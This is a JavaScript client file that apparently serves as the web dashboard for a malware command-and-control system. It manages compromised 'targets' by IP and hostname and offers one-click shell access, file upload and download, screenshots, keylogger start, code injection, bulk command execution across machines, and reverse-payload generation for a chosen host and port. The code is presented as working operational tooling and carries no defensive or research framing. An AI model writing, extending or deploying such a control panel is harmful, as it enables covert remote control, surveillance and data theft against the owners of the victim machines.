// Strategic Command Center - JavaScript
// Real-time functionality with no bullshit design

class StrategicCommandCenter {
    constructor() {
        this.socket = null;
        this.targets = new Map();
        this.selectedTarget = null;
        this.commandHistory = [];
        this.fileOperations = [];
        this.systemStats = {};
        
        this.init();
    }
    
    init() {
        this.connectWebSocket();
        this.setupEventListeners();
        this.startRealTimeUpdates();
        this.loadInitialData();
    }
    
    connectWebSocket() {
        this.socket = io();
        
        this.socket.on('connect', () => {
            console.log('🎯 Strategic Command Center connected');
            this.updateConnectionStatus(true);
        });
        
        this.socket.on('disconnect', () => {
            console.log('❌ Strategic Command Center disconnected');
            this.updateConnectionStatus(false);
        });
        
        // Strategic WebSocket events
        this.socket.on('targets_update', (data) => {
            this.updateTargets(data.targets);
        });
        
        this.socket.on('target_detail', (data) => {
            this.updateTargetDetail(data.target);
        });
        
        this.socket.on('command_queued', (data) => {
            this.showCommandQueued(data);
        });
        
        this.socket.on('command_result', (data) => {
            this.showCommandResult(data.result);
        });
        
        this.socket.on('parallel_commands_queued', (data) => {
            this.showParallelCommandsQueued(data);
        });
        
        this.socket.on('file_upload_queued', (data) => {
            this.showFileOperationQueued('upload', data);
        });
        
        this.socket.on('file_download_queued', (data) => {
            this.showFileOperationQueued('download', data);
        });
        
        this.socket.on('file_operation', (data) => {
            this.updateFileOperation(data.operation);
        });
        
        this.socket.on('system_stats', (data) => {
            this.updateSystemStats(data.stats);
        });
        
        this.socket.on('error', (data) => {
            this.showError(data.error);
        });
    }
    
    setupEventListeners() {
        // Top bar controls
        document.getElementById('refreshAllBtn').addEventListener('click', () => {
            this.refreshAll();
        });
        
        document.getElementById('bulkOpsBtn').addEventListener('click', () => {
            this.showBulkOperationsModal();
        });
        
        document.getElementById('systemStatsBtn').addEventListener('click', () => {
            this.showSystemStatsModal();
        });
        
        // Right panel controls
        document.getElementById('closeTargetPanel').addEventListener('click', () => {
            this.closeTargetPanel();
        });
        
        document.getElementById('closeCommandPanel').addEventListener('click', () => {
            this.closeCommandPanel();
        });
        
        // Command execution
        document.getElementById('executeCommandBtn').addEventListener('click', () => {
            this.executeCommand();
        });
        
        document.getElementById('commandInput').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                this.executeCommand();
            }
        });
        
        // File operations
        document.getElementById('listFilesBtn').addEventListener('click', () => {
            this.listFiles();
        });
        
        document.getElementById('uploadFileBtn').addEventListener('click', () => {
            this.uploadFile();
        });
        
        document.getElementById('downloadFileBtn').addEventListener('click', () => {
            this.downloadFile();
        });
        
        // Payload generation
        document.getElementById('generatePayloadBtn').addEventListener('click', () => {
            this.generatePayload();
        });
        
        // Bulk operations
        document.getElementById('executeBulkCommand').addEventListener('click', () => {
            this.executeBulkCommand();
        });
    }
    
    startRealTimeUpdates() {
        // Request initial data
        this.socket.emit('get_targets');
        this.socket.emit('get_system_stats');
        
        // Set up periodic updates
        setInterval(() => {
            this.socket.emit('get_targets');
            this.socket.emit('get_system_stats');
        }, 5000); // Update every 5 seconds
    }
    
    loadInitialData() {
        // Load any cached data from localStorage
        const cachedTargets = localStorage.getItem('strategic_targets');
        if (cachedTargets) {
            try {
                const targets = JSON.parse(cachedTargets);
                this.updateTargets(targets);
            } catch (e) {
                console.error('Failed to load cached targets:', e);
            }
        }
    }
    
    updateConnectionStatus(connected) {
        const statusElement = document.getElementById('refreshStatus');
        if (connected) {
            statusElement.textContent = '🔄 AUTO-REFRESH';
            statusElement.className = 'text-success';
        } else {
            statusElement.textContent = '❌ DISCONNECTED';
            statusElement.className = 'text-danger';
        }
    }
    
    updateTargets(targets) {
        this.targets.clear();
        targets.forEach(target => {
            this.targets.set(target.id, target);
        });
        
        this.renderTargetGrid();
        this.updateTargetCount();
        
        // Cache targets
        localStorage.setItem('strategic_targets', JSON.stringify(targets));
    }
    
    renderTargetGrid() {
        const grid = document.getElementById('targetGrid');
        grid.innerHTML = '';
        
        // Add targets
        this.targets.forEach(target => {
            const targetCard = this.createTargetCard(target);
            grid.appendChild(targetCard);
        });
        
        // Add "Add Target" card if less than 12 targets
        if (this.targets.size < 12) {
            const addCard = this.createAddTargetCard();
            grid.appendChild(addCard);
        }
    }
    
    createTargetCard(target) {
        const card = document.createElement('div');
        card.className = `target-card ${target.status}`;
        card.dataset.targetId = target.id;
        
        const statusClass = target.status === 'online' ? 'online' : 'offline';
        const healthColor = this.getHealthColor(target.health_score);
        
        card.innerHTML = `
            <div class="target-header">
                <div class="status-indicator ${statusClass}"></div>
                <div class="target-info">
                    <h3>${target.ip}</h3>
                    <p>${target.hostname} • ${target.os}</p>
                    <p class="text-muted">${this.formatLastSeen(target.last_seen)}</p>
                </div>
            </div>
            
            <div class="target-actions">
                <button class="action-btn" data-action="shell" data-target="${target.id}">SHELL</button>
                <button class="action-btn" data-action="files" data-target="${target.id}">FILES</button>
                <button class="action-btn" data-action="screen" data-target="${target.id}">SCREEN</button>
                <button class="action-btn" data-action="keylog" data-target="${target.id}">KEYLOG</button>
                <button class="action-btn" data-action="inject" data-target="${target.id}">INJECT</button>
                <button class="action-btn" data-action="select" data-target="${target.id}">SELECT</button>
            </div>
            
            <div class="target-status">
                <span>CPU: ${target.cpu_percent.toFixed(1)}%</span>
                <span>RAM: ${target.memory_percent.toFixed(1)}%</span>
                <span>NET: ${target.network_speed.toFixed(1)}MB/s</span>
                <span style="color: ${healthColor}">${target.health_score}/100</span>
            </div>
        `;
        
        // Add click handlers
        card.addEventListener('click', (e) => {
            if (e.target.classList.contains('action-btn')) {
                const action = e.target.dataset.action;
                const targetId = e.target.dataset.target;
                this.handleTargetAction(action, targetId);
            } else {
                this.selectTarget(target.id);
            }
        });
        
        return card;
    }
    
    createAddTargetCard() {
        const card = document.createElement('div');
        card.className = 'target-card add-target';
        card.innerHTML = `
            <div class="target-header">
                <div class="status-indicator offline"></div>
                <div class="target-info">
                    <h3>+ NEW TARGET</h3>
                    <p>Click to add new target</p>
                </div>
            </div>
            
            <div class="target-actions">
                <button class="action-btn" data-action="add">ADD TARGET</button>
            </div>
        `;
        
        card.addEventListener('click', () => {
            this.showAddTargetDialog();
        });
        
        return card;
    }
    
    handleTargetAction(action, targetId) {
        const target = this.targets.get(targetId);
        if (!target) return;
        
        switch (action) {
            case 'select':
                this.selectTarget(targetId);
                break;
            case 'shell':
                this.openShell(targetId);
                break;
            case 'files':
                this.openFiles(targetId);
                break;
            case 'screen':
                this.takeScreenshot(targetId);
                break;
            case 'keylog':
                this.startKeylogger(targetId);
                break;
            case 'inject':
                this.showInjectionOptions(targetId);
                break;
        }
    }
    
    selectTarget(targetId) {
        // Update UI
        document.querySelectorAll('.target-card').forEach(card => {
            card.classList.remove('selected');
        });
        
        const targetCard = document.querySelector(`[data-target-id="${targetId}"]`);
        if (targetCard) {
            targetCard.classList.add('selected');
        }
        
        this.selectedTarget = targetId;
        this.showTargetPanel(targetId);
    }
    
    showTargetPanel(targetId) {
        const target = this.targets.get(targetId);
        if (!target) return;
        
        // Hide other panels
        document.getElementById('defaultPanel').style.display = 'none';
        document.getElementById('commandPanel').style.display = 'none';
        
        // Show target panel
        const targetPanel = document.getElementById('targetPanel');
        targetPanel.style.display = 'block';
        
        // Update target info
        document.getElementById('selectedTargetName').textContent = `${target.ip} - ${target.hostname}`;
        document.getElementById('targetStatus').textContent = target.status.toUpperCase();
        document.getElementById('targetCpu').textContent = `${target.cpu_percent.toFixed(1)}%`;
        document.getElementById('targetMemory').textContent = `${target.memory_percent.toFixed(1)}%`;
        document.getElementById('targetNetwork').textContent = `${target.network_speed.toFixed(1)} MB/s`;
        document.getElementById('targetHealthScore').textContent = `${target.health_score}/100`;
        
        // Join target room for real-time updates
        this.socket.emit('join_target_room', { target_id: targetId });
    }
    
    closeTargetPanel() {
        document.getElementById('targetPanel').style.display = 'none';
        document.getElementById('defaultPanel').style.display = 'block';
        
        // Clear selection
        document.querySelectorAll('.target-card').forEach(card => {
            card.classList.remove('selected');
        });
        
        this.selectedTarget = null;
    }
    
    executeCommand() {
        if (!this.selectedTarget) return;
        
        const command = document.getElementById('commandInput').value.trim();
        if (!command) return;
        
        // Add to terminal output
        this.addTerminalLine(`$ ${command}`);
        
        // Execute command
        this.socket.emit('execute_command', {
            target_id: this.selectedTarget,
            command: command,
            parameters: {}
        });
        
        // Clear input
        document.getElementById('commandInput').value = '';
    }
    
    addTerminalLine(text, type = 'normal') {
        const terminal = document.getElementById('terminalOutput');
        const line = document.createElement('div');
        line.className = `terminal-line ${type}`;
        line.textContent = text;
        terminal.appendChild(line);
        terminal.scrollTop = terminal.scrollHeight;
    }
    
    showCommandQueued(data) {
        this.addTerminalLine(`Command queued: ${data.command}`, 'info');
    }
    
    showCommandResult(result) {
        if (result.success) {
            this.addTerminalLine(result.output, 'success');
        } else {
            this.addTerminalLine(`Error: ${result.error}`, 'error');
        }
    }
    
    showParallelCommandsQueued(data) {
        this.addTerminalLine(`Parallel commands queued on ${data.targets.length} targets: ${data.command}`, 'info');
    }
    
    showFileOperationQueued(operation, data) {
        this.addTerminalLine(`File ${operation} queued: ${data.filename}`, 'info');
    }
    
    updateFileOperation(operation) {
        this.addTerminalLine(`File operation ${operation.status}: ${operation.filename}`, 'info');
    }
    
    listFiles() {
        if (!this.selectedTarget) return;
        
        const path = document.getElementById('filePath').value || '/';
        this.socket.emit('list_files', {
            target_id: this.selectedTarget,
            path: path
        });
    }
    
    uploadFile() {
        if (!this.selectedTarget) return;
        
        const input = document.createElement('input');
        input.type = 'file';
        input.onchange = (e) => {
            const file = e.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = (e) => {
                    const content = btoa(e.target.result);
                    this.socket.emit('upload_file', {
                        target_id: this.selectedTarget,
                        filename: file.name,
                        content: content,
                        path: document.getElementById('filePath').value || '/tmp/'
                    });
                };
                reader.readAsBinaryString(file);
            }
        };
        input.click();
    }
    
    downloadFile() {
        if (!this.selectedTarget) return;
        
        const path = document.getElementById('filePath').value;
        if (!path) return;
        
        this.socket.emit('download_file', {
            target_id: this.selectedTarget,
            path: path
        });
    }
    
    generatePayload() {
        const type = document.getElementById('payloadType').value;
        const host = document.getElementById('payloadHost').value;
        const port = document.getElementById('payloadPort').value;
        
        if (!host || !port) {
            this.showError('Please enter host and port');
            return;
        }
        
        // Generate payload (this would call the backend)
        this.addTerminalLine(`Generating ${type} payload for ${host}:${port}`, 'info');
        
        // In a real implementation, this would call the payload generator
        fetch('/api/generate_payload', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRFToken': this.getCSRFToken()
            },
            body: JSON.stringify({
                type: type,
                host: host,
                port: port
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                this.addTerminalLine(`Payload generated: ${data.filename}`, 'success');
            } else {
                this.addTerminalLine(`Error: ${data.error}`, 'error');
            }
        })
        .catch(error => {
            this.addTerminalLine(`Error: ${error.message}`, 'error');
        });
    }
    
    showBulkOperationsModal() {
        const modal = document.getElementById('bulkOpsModal');
        const checkboxes = document.getElementById('bulkTargetCheckboxes');
        
        // Generate target checkboxes
        checkboxes.innerHTML = '';
        this.targets.forEach(target => {
            const checkbox = document.createElement('div');
            checkbox.className = 'target-checkbox';
            checkbox.innerHTML = `
                <input type="checkbox" id="target_${target.id}" value="${target.id}">
                <label for="target_${target.id}">${target.ip} - ${target.hostname}</label>
            `;
            checkboxes.appendChild(checkbox);
        });
        
        modal.style.display = 'flex';
    }
    
    closeBulkOpsModal() {
        document.getElementById('bulkOpsModal').style.display = 'none';
    }
    
    executeBulkCommand() {
        const command = document.getElementById('bulkCommand').value.trim();
        if (!command) return;
        
        const selectedTargets = [];
        document.querySelectorAll('#bulkTargetCheckboxes input[type="checkbox"]:checked').forEach(checkbox => {
            selectedTargets.push(checkbox.value);
        });
        
        if (selectedTargets.length === 0) {
            this.showError('Please select at least one target');
            return;
        }
        
        this.socket.emit('execute_parallel_commands', {
            targets: selectedTargets,
            command: command,
            parameters: {}
        });
        
        this.closeBulkOpsModal();
        this.addTerminalLine(`Bulk command queued on ${selectedTargets.length} targets: ${command}`, 'info');
    }
    
    showSystemStatsModal() {
        const modal = document.getElementById('systemStatsModal');
        const statsDisplay = document.getElementById('detailedSystemStats');
        
        statsDisplay.innerHTML = `
            <div class="stat-item">
                <span class="stat-label">Total Targets:</span>
                <span class="stat-value">${this.systemStats.total_targets || 0}</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">Online Targets:</span>
                <span class="stat-value">${this.systemStats.online_targets || 0}</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">Offline Targets:</span>
                <span class="stat-value">${this.systemStats.offline_targets || 0}</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">Commands Executed:</span>
                <span class="stat-value">${this.systemStats.total_commands || 0}</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">File Operations:</span>
                <span class="stat-value">${this.systemStats.total_file_operations || 0}</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">System CPU:</span>
                <span class="stat-value">${this.systemStats.system_cpu || 0}%</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">System Memory:</span>
                <span class="stat-value">${this.systemStats.system_memory || 0}%</span>
            </div>
        `;
        
        modal.style.display = 'flex';
    }
    
    closeSystemStatsModal() {
        document.getElementById('systemStatsModal').style.display = 'none';
    }
    
    updateSystemStats(stats) {
        this.systemStats = stats;
        
        // Update top bar
        document.getElementById('targetCount').textContent = `🎯 ${stats.total_targets || 0} TARGETS`;
        document.getElementById('commandCount').textContent = `⚡ ${stats.total_commands || 0} CMDS`;
        document.getElementById('fileCount').textContent = `📁 ${stats.total_file_operations || 0} FILES`;
        
        // Update default panel stats
        document.getElementById('activeTargetsCount').textContent = stats.online_targets || 0;
        document.getElementById('commandsExecutedCount').textContent = stats.total_commands || 0;
        document.getElementById('fileOperationsCount').textContent = stats.total_file_operations || 0;
        document.getElementById('systemCpu').textContent = `${stats.system_cpu || 0}%`;
        document.getElementById('systemMemory').textContent = `${stats.system_memory || 0}%`;
    }
    
    updateTargetCount() {
        const onlineCount = Array.from(this.targets.values()).filter(t => t.status === 'online').length;
        document.getElementById('activeTargetsCount').textContent = onlineCount;
    }
    
    refreshAll() {
        this.socket.emit('get_targets');
        this.socket.emit('get_system_stats');
        this.addTerminalLine('Refreshing all data...', 'info');
    }
    
    showError(message) {
        this.addTerminalLine(`Error: ${message}`, 'error');
    }
    
    getHealthColor(score) {
        if (score >= 80) return '#00ff00';
        if (score >= 60) return '#ffff00';
        if (score >= 40) return '#ff6600';
        return '#ff0000';
    }
    
    formatLastSeen(timestamp) {
        const now = Date.now() / 1000;
        const diff = now - timestamp;
        
        if (diff < 60) return `${Math.floor(diff)}s ago`;
        if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
        if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
        return `${Math.floor(diff / 86400)}d ago`;
    }
    
    getCSRFToken() {
        return document.querySelector('meta[name="csrf-token"]').getAttribute('content');
    }
    
    // Additional methods for specific actions
    openShell(targetId) {
        this.selectTarget(targetId);
        this.addTerminalLine(`Opening shell on ${targetId}`, 'info');
    }
    
    openFiles(targetId) {
        this.selectTarget(targetId);
        this.listFiles();
    }
    
    takeScreenshot(targetId) {
        this.socket.emit('execute_command', {
            target_id: targetId,
            command: 'screenshot',
            parameters: {}
        });
        this.addTerminalLine(`Taking screenshot on ${targetId}`, 'info');
    }
    
    startKeylogger(targetId) {
        this.socket.emit('execute_command', {
            target_id: targetId,
            command: 'keylogger start',
            parameters: {}
        });
        this.addTerminalLine(`Starting keylogger on ${targetId}`, 'info');
    }
    
    showInjectionOptions(targetId) {
        this.addTerminalLine(`Injection options for ${targetId}`, 'info');
        // This would show injection options modal
    }
    
    showAddTargetDialog() {
        this.addTerminalLine('Add target dialog (not implemented)', 'info');
        // This would show add target dialog
    }
}

// Initialize Strategic Command Center when page loads
document.addEventListener('DOMContentLoaded', () => {
    window.strategicCenter = new StrategicCommandCenter();
});

// Global functions for modal controls
function closeBulkOpsModal() {
    window.strategicCenter.closeBulkOpsModal();
}

function closeSystemStatsModal() {
    window.strategicCenter.closeSystemStatsModal();
}